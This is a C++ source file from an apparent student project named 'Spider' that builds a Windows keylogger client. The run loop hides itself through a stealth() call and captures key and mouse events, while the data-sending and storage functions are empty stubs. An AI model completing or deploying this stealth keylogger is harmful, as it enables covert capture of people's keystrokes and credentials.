//
// Core.cpp for Spider client in /home/touzet_t/epitech/cpp/cpp_spider/client
// 
// Made by Theo TOUZET
// Login   <touzet_t@epitech.net>
// 
// Started on  Tue Nov  1 13:50:03 2016 Theo TOUZET
// Last update Tue Nov  1 13:50:10 2016 Theo TOUZET
//

#include "Core.hh"

Core::Core()
{
	hIn = GetStdHandle(STD_INPUT_HANDLE);
	hOut = GetStdHandle(STD_OUTPUT_HANDLE);
}

Core::~Core()
{
}

int	Core::sendData(const std::string &msg)
{
	return (0);
}

int	Core::storeInReg(const std::string &msg)
{
	return (0);
}

int	Core::storeLocally(const std::string &msg)
{
	return (0);
}

int	Core::run()
{
	bool Continue = TRUE;

	keylog.stealth();
	while (Continue)
	{
		ReadConsoleInput(hIn,
			&InRec,
			1,
			&NumRead);

		switch (InRec.EventType)
		{
		case KEY_EVENT:
			if (keylog.getKey(InRec) == 1)
				Continue = FALSE;
			break;

		case MOUSE_EVENT:
			keylog.getMouse();
			break;
		}
	}
	return (0);
}